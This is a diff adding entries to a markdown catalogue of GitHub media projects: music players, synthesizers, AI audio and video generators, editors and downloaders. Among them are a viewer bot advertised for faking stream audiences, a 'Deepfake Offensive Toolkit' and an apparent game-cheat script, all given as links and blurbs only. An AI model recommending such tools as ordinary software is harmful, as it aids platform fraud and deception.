+
+
+---
+
+### 📦 VASTDynamics/Vaporizer2
+
+> **Categories:** `#aax` `#audio` `#audiounit_plugins` `#cpp` `#daw` `#music` `#plugin` `#sampler` `#synthesizer` `#vst` `#vst3` `#vst3_plugin` `#wavetable`
+
+Vaporizer2 hybrid wavetable additive / subtractive VST / AU / AAX synthesizer / sampler workstation plugin
+**Language**: C++
+
+- 🐙 **Source Code:** [https://github.com/VASTDynamics/Vaporizer2](https://github.com/VASTDynamics/Vaporizer2)
+- 👤 **Developer:** [VASTDynamics](https://github.com/VASTDynamics)
 
 
 ---
@@ -4320,6 +6644,18 @@ MellowMusic** is a convenient music player to play online music.
 
 ---
 
+### 📦 StreamViewBot/StreamViewerBot
+
+> **Categories:** `#bigolive` `#dlive` `#facebook_live` `#kick` `#stream` `#streambot` `#streamviewerbot` `#trovo` `#twitch` `#viewer` `#viewer_bot` `#viewerbot` `#youtube`
+
+Twitch , YouTube , Kick , Facebook Live , DLive , Nimo Tv , Trovo Live - Gain Viewer Effortlessly with our easy to use Stream Viewer Bot.
+
+- 🐙 **Source Code:** [https://github.com/StreamViewBot/StreamViewerBot](https://github.com/StreamViewBot/StreamViewerBot)
+- 👤 **Developer:** [StreamViewBot](https://github.com/StreamViewBot)
+
+
+---
+
 ### 📦 Beat Feet
 
 > **Categories:** `#Android`
@@ -4406,6 +6742,23 @@ A music player for local files with unique custom playback options.  mucke gets 
 
 ---
 
+### 📦 Text2Youtube
+
+> **Categories:** `#Interesting` `#Youtube`
+
+**
+Based on a text prompt, the AI generates a script, queries Youtube/Storyblocks for clips, generates a voice using Bark, and stitches everything together with MoviePY
+
+⤷ [Project link](https://github.com/artkulak/text2youtube)
+
+[GitHub](https://t.me/github_society) | #Interesting #Youtube
+
+- 🐙 **Source Code:** [https://github.com/artkulak/text2youtube](https://github.com/artkulak/text2youtube)
+- 👤 **Developer:** [artkulak](https://github.com/artkulak)
+
+
+---
+
 ### 📦 SmartTube** (a.k.a SmartTube Next)
 
 > **Categories:** `#installation` `#features` `#updating` `#compatibility` `#device` `#Android`
@@ -4435,6 +6788,21 @@ SmartTube Android TV app is a free and open source player for YouTube content on
 **Android video player based on Media3 (formerly ExoPlayer), compatible with Android 5+ and Android TV. It uses ExoPlayer's ffmpeg extension with all its audio formats enabled (it can handle even special formats like AC3, EAC3, DTS, DTS HD, TrueHD etc.). It properly syncs audio with video track when using Bluetooth earphones/speaker.
 
 - 🐙 **Source Code:** [https://github.com/moneytoo/Player](https://github.com/moneytoo/Player)
+
+
+---
+
+### 📦 haoheliu/AudioLDM2
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Text-to-Audio/Music Generation
+**Language**: Python
+**Stars**: 499 **Issues**: 9 **Forks**: 34
+[https://github.com/haoheliu/AudioLDM2](https://github.com/haoheliu/AudioLDM2)
+
+- 🐙 **Source Code:** [https://github.com/haoheliu/AudioLDM2](https://github.com/haoheliu/AudioLDM2)
+- 👤 **Developer:** [haoheliu](https://github.com/haoheliu)
 
 
 ---
@@ -4522,6 +6890,93 @@ Platform(s); #Android
 
 ---
 
+### 📦 dttung2905/kafka-in-production
+
+> **Categories:** `#distributed_systems` `#kafka` `#streaming`
+
+:books: Tech blogs & talks by companies that run Kafka in production
+
+- 🐙 **Source Code:** [https://github.com/dttung2905/kafka-in-production](https://github.com/dttung2905/kafka-in-production)
+- 👤 **Developer:** [dttung2905](https://github.com/dttung2905)
+
+
+---
+
+### 📦 dredozubov/polyrhythmix
+
+> **Categories:** `#drums` `#drums_generation` `#midi` `#music` `#polyrhythm` `#polyrhythms` `#rust`
+
+Polyrhythmically-inclinded Midi Drum generator
+**Language**: Rust
+
+- 🐙 **Source Code:** [https://github.com/dredozubov/polyrhythmix](https://github.com/dredozubov/polyrhythmix)
+- 👤 **Developer:** [dredozubov](https://github.com/dredozubov)
+
+
+---
+
+### 📦 steven-tey/chathn
+
+> **Categories:** `#ai` `#ai_sdk` `#edge_functions` `#hacker_news` `#nextjs` `#openai` `#openai_functions` `#streaming` `#vercel`
+
+Chat with Hacker News using natural language. Built with OpenAI Functions and Vercel AI SDK.
+**Language**: TypeScript
+
+- 🐙 **Source Code:** [https://github.com/steven-tey/chathn](https://github.com/steven-tey/chathn)
+- 👤 **Developer:** [steven-tey](https://github.com/steven-tey)
+
+
+---
+
+### 📦 Coltrane
+
+> **Categories:** `#Ruby` `#Music` `#Interesting`
+
+To work with this library, a CLI interface is used
+
+Theory is demonstrated with examples for guitar, bass, piano or ukelele
+
+⤷ [Project link](https://github.com/pedrozath/coltrane)
+
+[GitHub](https://t.me/github_society) | #Ruby #Music #Interesting
+
+- 🐙 **Source Code:** [https://github.com/pedrozath/coltrane](https://github.com/pedrozath/coltrane)
+- 👤 **Developer:** [pedrozath](https://github.com/pedrozath)
+
+
+---
+
+### 📦 Webcam Filters
+
+> **Categories:** `#Linux` `#Video` `#Interesting`
+
+The app creates a virtual webcam with a common set of filters that you can use in other video conferencing apps
+
+⤷ [Project link](https://github.com/jashandeep-sohi/webcam-filters)
+
+[GitHub](https://t.me/github_community) | #Linux #Video #Interesting
+
+- 🐙 **Source Code:** [https://github.com/jashandeep-sohi/webcam-filters](https://github.com/jashandeep-sohi/webcam-filters)
+- 👤 **Developer:** [jashandeep-sohi](https://github.com/jashandeep-sohi)
+
+
+---
+
+### 📦 facebookresearch/audiocraft
+
+> **Categories:** `#GitHub` `#OpenSource` `#Audio` `#craft` `#audiocraft`
+
+Audiocraft is a library for audio processing and generation with deep learning. It features the state-of-the-art EnCodec audio compressor / tokenizer, along with MusicGen, a simple and controllable music generation LM with textual and melodic conditioning.
+**Language**: Python
+**Stars**: 938 **Issues**: 15 **Forks**: 55
+[https://github.com/facebookresearch/audiocraft](https://github.com/facebookresearch/audiocraft)
+
+- 🐙 **Source Code:** [https://github.com/facebookresearch/audiocraft](https://github.com/facebookresearch/audiocraft)
+- 👤 **Developer:** [facebookresearch](https://github.com/facebookresearch)
+
+
+---
+
 ### 📦 Lyricify - A fantastic app to provide scroll lyrics for Spotify
 
 > **Categories:** `#Android` `#Windows`
@@ -4544,6 +6999,97 @@ __- Lyricify 3 (End-Of-Support) is an older version of Lyricify that supports Sp
 **Just another good Material You music player.
 
 - 🐙 **Source Code:** [https://github.com/zyrouge/symphony](https://github.com/zyrouge/symphony)
+
+
+---
+
+### 📦 StanGirard/quiver
+
+> **Categories:** `#audio` `#chat` `#chatgpt` `#csv` `#embeddings` `#generativeai` `#obsidian` `#pdf` `#second_brain` `#vectorstore` `#whisper`
+
+Dump all your files and thoughts into your GenerativeAI brain and chat with it
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/StanGirard/quiver](https://github.com/StanGirard/quiver)
+- 👤 **Developer:** [StanGirard](https://github.com/StanGirard)
+
+
+---
+
+### 📦 Track-Anything
+
+> **Categories:** `#tracking` `#xmem` `#Interesting` `#Video`
+
+Track**-Anything is a flexible and interactive tool for video object tracking and segmentation, based on Segment Anything, XMem, and E2FGVI.
+
+Creator:  Mingqi Gao
+Stars ⭐️: 3.2k
+Forked By: 174
+https://github.com/gaomingqi/Track-Anything
+
+- 🐙 **Source Code:** [https://github.com/gaomingqi/Track-Anything](https://github.com/gaomingqi/Track-Anything)
+- 👤 **Developer:** Mingqi Gao
+
+
+---
+
+### 📦 AudioGPT
+
+> **Categories:** `#AudioGPT` `#gpt`
+
+**AudioGPT: Understanding and Generating Speech, Music, Sound, and Talking Head
+
+Creator:  AIGC-Audio
+Stars ⭐️: 2.1k
+Forked By: 158
+https://github.com/AIGC-Audio/AudioGPT
+
+- 🐙 **Source Code:** [https://github.com/AIGC-Audio/AudioGPT](https://github.com/AIGC-Audio/AudioGPT)
+- 👤 **Developer:** AIGC-Audio
+
+
+---
+
+### 📦 OpenGVLab/Ask-Anything
+
+> **Categories:** `#captioning_videos` `#chat` `#chatgpt` `#gradio` `#langchain` `#moss` `#stablelm` `#video` `#video_question_answering` `#video_understanding`
+
+a simple yet interesting tool for chatting about video with chatGPT, miniGPT4 and StableLM
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/OpenGVLab/Ask-Anything](https://github.com/OpenGVLab/Ask-Anything)
+- 👤 **Developer:** [OpenGVLab](https://github.com/OpenGVLab)
+
+
+---
+
+### 📦 VideoCrafter/VideoCrafter
+
+> **Categories:** `#GitHub` `#OpenSource` `#Interesting` `#Video`
+
+A Toolkit for Text-to-Video Generation and Editing
+**Language**: Python
+**Stars**: 410 **Issues**: 3 **Forks**: 19
+[https://github.com/VideoCrafter/VideoCrafter](https://github.com/VideoCrafter/VideoCrafter)
+
+- 🐙 **Source Code:** [https://github.com/VideoCrafter/VideoCrafter](https://github.com/VideoCrafter/VideoCrafter)
+- 👤 **Developer:** [VideoCrafter](https://github.com/VideoCrafter)
+
+
+---
+
+### 📦 Ambient
+
+> **Categories:** `#Interesting` `#Game` `#3D`
+
+The engine provides a runtime for creating multiplayer games and 3D applications that compile to a WebAssembly representation and use the WebGPU API for rendering
+
+⤷ [Project link](https://github.com/AmbientRun/Ambient)
+
+[GitHub](https://t.me/github_society) | #Interesting #Game #3D
+
+- 🐙 **Source Code:** [https://github.com/AmbientRun/Ambient](https://github.com/AmbientRun/Ambient)
+- 👤 **Developer:** [AmbientRun](https://github.com/AmbientRun)
 
 
 ---
@@ -4596,6 +7142,76 @@ Platform(s); #Android
 
 ---
 
+### 📦 Send To Vlc
+
+> **Categories:** `#JavaScript` `#Browser` `#Interesting`
+
+Supports:
+• MPV player (Chrome, Firefox)
+• MPlayer (Chrome, Firefox, Opera)
+• MPC (Chrome, Firefox, Opera)
+• VLC VideoLan (Chrome, Firefox, Opera)
+
+⤷ [Project link](https://github.com/belaviyo/send-to-vlc)
+
+[GitHub](https://t.me/github_society) | #JavaScript #Browser #Interesting
+
+- 🐙 **Source Code:** [https://github.com/belaviyo/send-to-vlc](https://github.com/belaviyo/send-to-vlc)
+- 👤 **Developer:** [belaviyo](https://github.com/belaviyo)
+
+
+---
+
+### 📦 Pitivi
+
+> **Categories:** `#Interesting` `#Video` `#Editor` `#Useful`
+
+Pitivi has support for an unlimited number of layers, saving a complete history of operations with the ability to rollback, displaying thumbnails on the timeline, support for typical video and audio processing operations
+
+⤷ [Project link](https://github.com/pitivi/pitivi)
+
+[GitHub](https://t.me/github_society) | #Interesting #Video #Editor #Useful
+
+- 🐙 **Source Code:** [https://github.com/pitivi/pitivi](https://github.com/pitivi/pitivi)
+- 👤 **Developer:** [pitivi](https://github.com/pitivi)
+
+
+---
+
+### 📦 ytdl-org/youtube-dl
+
+> **Categories:** `#youtube` `#cmd` `#readme`
+
+Command**-line program to download videos from YouTube.com and other video sites
+
+Creator:  youtube-dl
+Stars ⭐️: 118k
+Forked By: 8.7k
+https://github.com/ytdl-org/youtube-dl
+
+- 🐙 **Source Code:** [https://github.com/ytdl-org/youtube-dl](https://github.com/ytdl-org/youtube-dl)
+- 🌐 **Official Website:** [https://github.com/ytdl-org/youtube-dl](https://github.com/ytdl-org/youtube-dl)
+- 👤 **Developer:** youtube-dl
+
+
+---
+
+### 📦 Pyaudioanalysis
+
+> **Categories:** `#Python` `#Audio` `#Analyzer` `#Interesting`
+
+With pyAudioAnalysis you can classify unknown sounds, recognize sounds using machine learning and much more
+
+⤷ [Project link](https://github.com/tyiannak/pyAudioAnalysis)
+
+[GitHub](https://t.me/github_society) | #Python #Audio #Analyzer #Interesting
+
+- 🐙 **Source Code:** [https://github.com/tyiannak/pyAudioAnalysis](https://github.com/tyiannak/pyAudioAnalysis)
+- 👤 **Developer:** [tyiannak](https://github.com/tyiannak)
+
+
+---
+
 ### 📦 Have you ever thought that you can use YouTube as an unlimited cloud storage?
 
 > **Categories:** `#rust` `#storage` `#terminal` `#tui` `#video` `#youtube` `#Infinite` `#glitch`
@@ -4638,6 +7254,62 @@ You can find the necessary links below.
 
 ---
 
+### 📦 Vidgear
+
+> **Categories:** `#Interesting` `#Python` `#Useful` `#Video`
+
+⤷ [Ссылка на проект](https://github.com/abhiTronix/vidgear)
+
+[GitHub](https://t.me/github_society) | #Interesting #Python #Useful #Video
+
+- 🐙 **Source Code:** [https://github.com/abhiTronix/vidgear](https://github.com/abhiTronix/vidgear)
+- 👤 **Developer:** [abhiTronix](https://github.com/abhiTronix)
+
+
+---
+
+### 📦 samim23/polymath
+
+> **Categories:** `#audio` `#machine_learning` `#ml` `#music` `#python`
+
+Convert any music library into a music production sample-library with ML
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/samim23/polymath](https://github.com/samim23/polymath)
+- 👤 **Developer:** [samim23](https://github.com/samim23)
+
+
+---
+
+### 📦 Musort
+
+> **Categories:** `#Interesting` `#Useful` `#Music`
+
+Allows you to more easily organize your music library
+
+⤷ [Project link](https://github.com/tdeerenberg/Musort)
+
+[GitHub](https://t.me/github_society) | #Interesting #Useful #Music
+
+- 🐙 **Source Code:** [https://github.com/tdeerenberg/Musort](https://github.com/tdeerenberg/Musort)
+- 👤 **Developer:** [tdeerenberg](https://github.com/tdeerenberg)
+
+
+---
+
+### 📦 jafarlihi/sysm
+
+> **Categories:** `#audio` `#linux` `#music` `#system_monitor` `#system_monitoring` `#Interesting` `#Useful` `#System`
+
+sysm makes your system play custom sounds when any configured system or external event happens
+**Language**: C++
+
+- 🐙 **Source Code:** [https://github.com/jafarlihi/sysm](https://github.com/jafarlihi/sysm)
+- 👤 **Developer:** [jafarlihi](https://github.com/jafarlihi)
+
+
+---
+
 ### 📦 Vibe Music - music streaming app
 
 > **Categories:** `#Android`
@@ -4645,6 +7317,246 @@ You can find the necessary links below.
 Vibe Music is an app that allows you to listen to music with YouTube Music, but without ads and in high quality.
 
 - 🐙 **Source Code:** [https://github.com/sheikhhaziq/vibemusic](https://github.com/sheikhhaziq/vibemusic)
+
+
+---
+
+### 📦 Remsi
+
+> **Categories:** `#Python` `#Video` `#Interesting`
+
+⤷ [Project link](https://github.com/bambax/Remsi)
+
+[GitHub](https://t.me/github_community) | #Python #Video #Interesting
+
+- 🐙 **Source Code:** [https://github.com/bambax/Remsi](https://github.com/bambax/Remsi)
+- 👤 **Developer:** [bambax](https://github.com/bambax)
+
+
+---
+
+### 📦 Auto Synced Translated Dubs
+
+> **Categories:** `#Interesting` `#Video` `#Audio`
+
+⤷ [Project Link](https://github.com/ThioJoe/Auto-Synced-Translated-Dubs)
+⤷ [Example](https://youtu.be/uaHmtJrZRdM)
+
+[GitHub](https://t.me/github_society) | #Interesting #Video #Audio
+
+- 🐙 **Source Code:** [https://github.com/ThioJoe/Auto-Synced-Translated-Dubs](https://github.com/ThioJoe/Auto-Synced-Translated-Dubs)
+- 👤 **Developer:** [ThioJoe](https://github.com/ThioJoe)
+
+
+---
+
+### 📦 davidfowl/TriviaR
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+A multiplayer trivia game using SignalR and .NET 7
+**Language**: C#
+**Stars**: 108 **Issues**: 0 **Forks**: 4
+[https://github.com/davidfowl/TriviaR](https://github.com/davidfowl/TriviaR)
+
+- 🐙 **Source Code:** [https://github.com/davidfowl/TriviaR](https://github.com/davidfowl/TriviaR)
+- 👤 **Developer:** [davidfowl](https://github.com/davidfowl)
+
+
+---
+
+### 📦 ilaria-manco/multimodal-ml-music
+
+> **Categories:** `#academic_publications` `#awesome_list` `#multimodal_data` `#multimodal_deep_learning` `#multimodal_learning` `#music_ai` `#music_information_retrieval` `#music_research` `#resources`
+
+List of academic resources on Multimodal ML for Music
+**Language**: TeX
+
+- 🐙 **Source Code:** [https://github.com/ilaria-manco/multimodal-ml-music](https://github.com/ilaria-manco/multimodal-ml-music)
+- 👤 **Developer:** [ilaria-manco](https://github.com/ilaria-manco)
+
+
+---
+
+### 📦 Untrunc
+
+> **Categories:** `#Interesting` `#Video` `#Useful`
+
+Uses a file shot on the same camera as a reference for restoration
+
+⤷ [Project link](https://github.com/anthwlock/untrunc)
+
+[GitHub](https://t.me/github_society) | #Interesting #Video #Useful
+
+- 🐙 **Source Code:** [https://github.com/anthwlock/untrunc](https://github.com/anthwlock/untrunc)
+- 👤 **Developer:** [anthwlock](https://github.com/anthwlock)
+
+
+---
+
+### 📦 Youtube Chapters In Player
+
+> **Categories:** `#Interesting` `#Extension` `#Useful`
+
+Works in full screen and “theater” modes
+
+⤷ [Project link](https://github.com/ris58h/youtube-chapters-in-player)
+
+[GitHub](https://t.me/github_society) | #Interesting #Extension #Useful
+
+- 🐙 **Source Code:** [https://github.com/ris58h/youtube-chapters-in-player](https://github.com/ris58h/youtube-chapters-in-player)
+- 👤 **Developer:** [ris58h](https://github.com/ris58h)
+
+
+---
+
+### 📦 Vhs
+
+> **Categories:** `#Interesting` `#Terminal` `#Video`
+
+Possibility of fine-tuning to suit your preferences
+
+⤷ [Project link](https://github.com/charmbracelet/vhs)
+
+[GitHub](https://t.me/github_society) | #Interesting #Terminal #Video
+
+- 🐙 **Source Code:** [https://github.com/charmbracelet/vhs](https://github.com/charmbracelet/vhs)
+- 👤 **Developer:** [charmbracelet](https://github.com/charmbracelet)
+
+
+---
+
+### 📦 Auxio
+
+> **Categories:** `#Interesting` `#Android` `#Audio` `#Player`
+
+The trick is that it doesn't have most of the useless features found in other music players.
+
+⤷ [Project link](https://github.com/oxygencobalt/Auxio)
+
+[GitHub](https://t.me/github_society) | #Interesting #Android #Audio #Player
+
+- 🐙 **Source Code:** [https://github.com/oxygencobalt/Auxio](https://github.com/oxygencobalt/Auxio)
+- 👤 **Developer:** [oxygencobalt](https://github.com/oxygencobalt)
+
+<details>
+<summary><b>🖼️ Preview Screenshots & Media (1)</b> — <i>Click to view images & decide if you want to use this app</i></summary>
+
+#### 📸 Cover / Preview
+<p align="center"><img src="../../assets/apps/auxio/cover.jpg" alt="Cover / Preview" style="max-height: 480px; max-width: 100%; border-radius: 8px; margin: 8px auto;" /></p>
+
+</details>
+
+
+---
+
+### 📦 Neteasecloudmusicapi
+
+> **Categories:** `#Interesting` `#Web` `#Useful`
+
+Supports npx, automatically installs dependencies and runs them
+
+⤷[Project link](https://github.com/Binaryify/NeteaseCloudMusicApi)
+
+[GitHub](https://t.me/github_society) | #Interesting #Web #Useful
+
+- 🐙 **Source Code:** [https://github.com/Binaryify/NeteaseCloudMusicApi](https://github.com/Binaryify/NeteaseCloudMusicApi)
+- 👤 **Developer:** [Binaryify](https://github.com/Binaryify)
+
+
+---
+
+### 📦 trevorjay/Jerrica
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Jerrica is a small, bare bones, 100% scheduled, web audio native, MOD player designed to be embedded in Javascript games
+**Language**: JavaScript
+**Stars**: 137 **Issues**: 1 **Forks**: 2
+[https://github.com/trevorjay/Jerrica](https://github.com/trevorjay/Jerrica)
+
+- 🐙 **Source Code:** [https://github.com/trevorjay/Jerrica](https://github.com/trevorjay/Jerrica)
+- 👤 **Developer:** [trevorjay](https://github.com/trevorjay)
+
+
+---
+
+### 📦 MubertAI/Mubert-Text-to-Music
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+A simple notebook demonstrating prompt-based music generation via Mubert API
+**Language**: Jupyter Notebook
+**Stars**: 208 **Issues**: 3 **Forks**: 16
+[https://github.com/MubertAI/Mubert-Text-to-Music](https://github.com/MubertAI/Mubert-Text-to-Music)
+
+- 🐙 **Source Code:** [https://github.com/MubertAI/Mubert-Text-to-Music](https://github.com/MubertAI/Mubert-Text-to-Music)
+- 👤 **Developer:** [MubertAI](https://github.com/MubertAI)
+
+
+---
+
+### 📦 obsproject/obs-studio
+
+> **Categories:** `#GitHub` `#OpenSource` `#readme` `#c` `#c_plus_plus` `#ffmpeg` `#live_streaming` `#video_recording` `#screen_capture` `#twitch_tv` `#directshow` `#facebook_live` `#youtube_live` `#game_capture` `#Streaming` `#Screen` `#Recording`
+
+OBS Studio - Free and open source software for live streaming and screen recording
+
+Creator: OBS
+Stars ⭐️: 40.7k
+Forked By: 6.2k
+
+- 🐙 **Source Code:** [https://github.com/obsproject/obs-studio](https://github.com/obsproject/obs-studio)
+- 🌐 **Official Website:** [https://obsproject.com](https://obsproject.com)
+- 👤 **Developer:** OBS
+
+
+---
+
+### 📦 Gifcurry
+
+> **Categories:** `#ElectronFree` `#Interesting` `#Video` `#Haskel`
+
+Gifcurry is 100% #ElectronFree
+“No need to load more RAM”
+
+⤷ [Project link](https://github.com/lettier/gifcurry)
+
+[GitHub](https://t.me/+odUTRyjOxj41NjY6) | #Interesting #Video #Haskel
+
+- 🐙 **Source Code:** [https://github.com/lettier/gifcurry](https://github.com/lettier/gifcurry)
+- 👤 **Developer:** [lettier](https://github.com/lettier)
+
+
+---
+
+### 📦 unkperson/player-model-changer
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+💉: gamesense lua script to change local player model
+**Language**: Lua
+**Stars**: 100 **Issues**: 0 **Forks**: 0
+[https://github.com/unkperson/player-model-changer](https://github.com/unkperson/player-model-changer)
+
+- 🐙 **Source Code:** [https://github.com/unkperson/player-model-changer](https://github.com/unkperson/player-model-changer)
+- 👤 **Developer:** [unkperson](https://github.com/unkperson)
+
+
+---
+
+### 📦 Remotevideocam
+
+> **Categories:** `#Interesting` `#Android` `#Video` `#Useful`
+
+The application can be used to monitor things in the house or yard, as a walkie-talkie, etc.
+
+⤷ [Project link](https://github.com/izivkov/RemoteVideoCam)
+
+[GitHub](https://t.me/github_community) | #Interesting #Android #Video #Useful
+
+- 🐙 **Source Code:** [https://github.com/izivkov/RemoteVideoCam](https://github.com/izivkov/RemoteVideoCam)
+- 👤 **Developer:** [izivkov](https://github.com/izivkov)
 
 
 ---
@@ -4731,6 +7643,90 @@ Platform(s); #Android
 
 ---
 
+### 📦 Stemroller
+
+> **Categories:** `#Interesting` `#Audio` `#Music`
+
+Just enter the song name into the search bar - StemRoller will find the song on YouTube and divide it into four groups: vocals, drums, bass and everything else
+
+⤷ [Project link](https://github.com/stemrollerapp/stemroller)
+
+[GitHub](https://t.me/github_community) | #Interesting #Audio #Music
+
+- 🐙 **Source Code:** [https://github.com/stemrollerapp/stemroller](https://github.com/stemrollerapp/stemroller)
+- 👤 **Developer:** [stemrollerapp](https://github.com/stemrollerapp)
+
+
+---
+
+### 📦 Dragon Userbot
+
+> **Categories:** `#custom` `#Python` `#Telegram` `#Userbot` `#GitHub` `#OpenSource`
+
+How it works:** the script is tied to a user account (authorization in tg by phone number) and catches commands from this user.
+
+**How ​​to use: **if you write `.ban` in a chat and reply to a message, the author of this message will be banned (provided that you are an admin), there is also a module for playing music in voice chat and many other useful modules, the full list is available using the `.help` command, as well as [here](https://t.me/Dragon_Userbot_chat/35275).
+Brief documentation has been written for each module, available using the command `.help module_name
+
+`__Suggest your own or another interesting project: ____@mintotii__`
+`[GitHub](https://t.me/github_community) | #Python #Telegram #Userbot
+
+- 🐙 **Source Code:** [https://github.com/Dragon-Userbot/Dragon-Userbot](https://github.com/Dragon-Userbot/Dragon-Userbot)
+- 👤 **Developer:** [Dragon-Userbot](https://github.com/Dragon-Userbot)
+
+
+---
+
+### 📦 Spicetify Cli
+
+> **Categories:** `#JavaScript` `#Useful` `#Interesting` `#Linux` `#MacOS`
+
+__**Features:**
+• Ability to change the color of the entire user interface
+• CSS for advanced customization
+• Ability to connect other extensions (JavaScript scripts) to manipulate the user interface and control the player
+• Ability to remove bloated components to improve performance
+
+⤷ [Project link](https://github.com/khanhas/spicetify-cli)
+
+[GitHub](https://t.me/github_community) | #JavaScript #Useful
+
+- 🐙 **Source Code:** [https://github.com/khanhas/spicetify-cli](https://github.com/khanhas/spicetify-cli)
+- 👤 **Developer:** [khanhas](https://github.com/khanhas)
+
+
+---
+
+### 📦 ZaneH/piano-trainer
+
+> **Categories:** `#audio` `#chords` `#circle_of_fifths` `#keyboard` `#midi` `#midir` `#music` `#music_learning` `#music_theory` `#piano` `#piano_lessons` `#quiz` `#react` `#react_piano` `#rust` `#scales` `#tauri` `#trainer`
+
+🎹 Memorize piano scales with ease! A music practice program w/ MIDI support. Consider it an interactive reference manual
+**Language**: TypeScript
+
+- 🐙 **Source Code:** [https://github.com/ZaneH/piano-trainer](https://github.com/ZaneH/piano-trainer)
+- 👤 **Developer:** [ZaneH](https://github.com/ZaneH)
+
+
+---
+
+### 📦 tldraw / tldraw
+
+> **Categories:** `#GitHub` `#OpenSource` `#readme` `#react` `#drawing` `#design` `#sync` `#sdk` `#canvas` `#diagram` `#multiplayer` `#sketch` `#collaboration` `#whiteboard` `#infinite`
+
+A** tiny little drawing app.
+
+Creator: tldraw
+Stars ⭐️: 8.1k
+Forked By: 422
+
+- 🐙 **Source Code:** [https://github.com/tldraw/tldraw](https://github.com/tldraw/tldraw)
+- 🌐 **Official Website:** [https://tldraw.dev](https://tldraw.dev)
+- 👤 **Developer:** tldraw
+
+
+---
+
 ### 📦 [​​](https://telegra.ph/file/c968570052fa59a700d8d.jpg)🎧 **How to cut a voice or minus from a track without complex programs
 
 > **Categories:** `#Web`
@@ -4786,6 +7782,91 @@ Platform(s); #Android
 
 ---
 
+### 📦 csteinmetz1/ai-audio-startups
+
+> **Categories:** `#audio` `#list` `#startups`
+
+Community list of startups working with AI in audio and music technology
+
+- 🐙 **Source Code:** [https://github.com/csteinmetz1/ai-audio-startups](https://github.com/csteinmetz1/ai-audio-startups)
+- 👤 **Developer:** [csteinmetz1](https://github.com/csteinmetz1)
+
+
+---
+
+### 📦 IonelPopJara/ascii-video-player
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+A simple script that turns .mp4 files into ASCII characters
+**Language**: C++
+**Stars**: 210 **Issues**: 2 **Forks**: 28
+[https://github.com/IonelPopJara/ascii-video-player](https://github.com/IonelPopJara/ascii-video-player)
+
+- 🐙 **Source Code:** [https://github.com/IonelPopJara/ascii-video-player](https://github.com/IonelPopJara/ascii-video-player)
+- 👤 **Developer:** [IonelPopJara](https://github.com/IonelPopJara)
+
+
+---
+
+### 📦 sensity-ai/dot
+
+> **Categories:** `#GitHub` `#OpenSource` `#Interesting` `#Video` `#Deepfake`
+
+The Deepfake Offensive Toolkit
+**Language**: Python
+**Stars**: 1302 **Issues**: 5 **Forks**: 81
+[https://github.com/sensity-ai/dot](https://github.com/sensity-ai/dot)
+
+- 🐙 **Source Code:** [https://github.com/sensity-ai/dot](https://github.com/sensity-ai/dot)
+- 👤 **Developer:** [sensity-ai](https://github.com/sensity-ai)
+
+
+---
+
+### 📦 Shotcut
+
+> **Categories:** `#Cpp` `#Video` `#Editor`
+
+**
+A nice feature is the absence of various restrictions: resolution, time, lack of watermarks or additional payment functions.
+
+[GitHub](https://t.me/github_community) | #Cpp #Video #Editor
+
+- 🐙 **Source Code:** [https://github.com/mltframework/shotcut](https://github.com/mltframework/shotcut)
+- 👤 **Developer:** [mltframework](https://github.com/mltframework)
+
+
+---
+
+### 📦 vfsfitvnm/ViMusic
+
+> **Categories:** `#android` `#jetpack_compose` `#music_player` `#youtube` `#kotlin` `#music`
+
+A Jetpack Compose Android application for streaming music from YouTube Music.
+**Language**: Kotlin
+
+- 🐙 **Source Code:** [https://github.com/vfsfitvnm/ViMusic](https://github.com/vfsfitvnm/ViMusic)
+- 👤 **Developer:** [vfsfitvnm](https://github.com/vfsfitvnm)
+
+
+---
+
+### 📦 Dfspot Deepfake Recognition
+
+> **Categories:** `#Python` `#Interesting` `#Video` `#Neural` `#Network` `#osint`
+
+⤷ Ссылка на [Google Colab](https://colab.research.google.com/drive/1s0e0OO_Xcyw7S81s8GydTDtTQXJvJPpL?usp=sharing)
+
+[GitHub](https://t.me/github_community) | #Python #Interesting #Video #Neural #Network
+
+- 🐙 **Source Code:** [https://github.com/chinmaynehate/DFSpot-Deepfake-Recognition](https://github.com/chinmaynehate/DFSpot-Deepfake-Recognition)
+- 🌐 **Official Website:** [https://chrome.google.com/webstore/detail/fake-profile-detector-dee/jbpcgcnnhmjmajjkgdaogpgefbnokpcc](https://chrome.google.com/webstore/detail/fake-profile-detector-dee/jbpcgcnnhmjmajjkgdaogpgefbnokpcc)
+- 👤 **Developer:** [chinmaynehate](https://github.com/chinmaynehate)
+
+
+---
+
 ### 📦 Spotu**be - A free Spotify client
 
 > **Categories:** `#Android` `#Interesting` `#GitHub` `#OpenSource`
@@ -4814,6 +7895,119 @@ Platform(s); #Android
 
 ---
 
+### 📦 Youtube Extension
+
+> **Categories:** `#JavaScript` `#Extension` `#Browser` `#Useful` `#GitHub` `#OpenSource`
+
+With ImprovedTube you can set a constant player size, make playlists play in reverse, set a constant playback speed or fix video quality and many other options.
+
+**⤷** [Website](http://improvedtube.com/)
+
+[GitHub](https://t.me/github_community) | #JavaScript #Extension #Browser #Useful
+
+- 🐙 **Source Code:** [https://github.com/code4charity/YouTube-Extension](https://github.com/code4charity/YouTube-Extension)
+- 👤 **Developer:** [code4charity](https://github.com/code4charity)
+
+
+---
+
+### 📦 openmultiplayer/server-beta
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+open.mp server beta releases
+**Stars**: 70 **Issues**: 13 **Forks**: 4
+[https://github.com/openmultiplayer/server-beta](https://github.com/openmultiplayer/server-beta)
+
+- 🐙 **Source Code:** [https://github.com/openmultiplayer/server-beta](https://github.com/openmultiplayer/server-beta)
+- 👤 **Developer:** [openmultiplayer](https://github.com/openmultiplayer)
+
+
+---
+
+### 📦 Boardgame.Io
+
+> **Categories:** `#TypeScript` `#Game` `#Engine`
+
+By writing a few simple functions that describe how the game's state changes when a certain action is taken, you can program a game script that automatically translates into a playable program without requiring you to write a single line of networking or storage code.__
+
+**Features**:
+• __State management
+• Multiplayer game
+• AI: Generated bots that can play your game.
+• Customize game phases: with different game rules and turn order.
+• Lobby: selection of games, players.
+• Prototyping: An interface for simulating moves before the actual game rendering process.
+• A plugin system that allows you to create new abstractions.
+
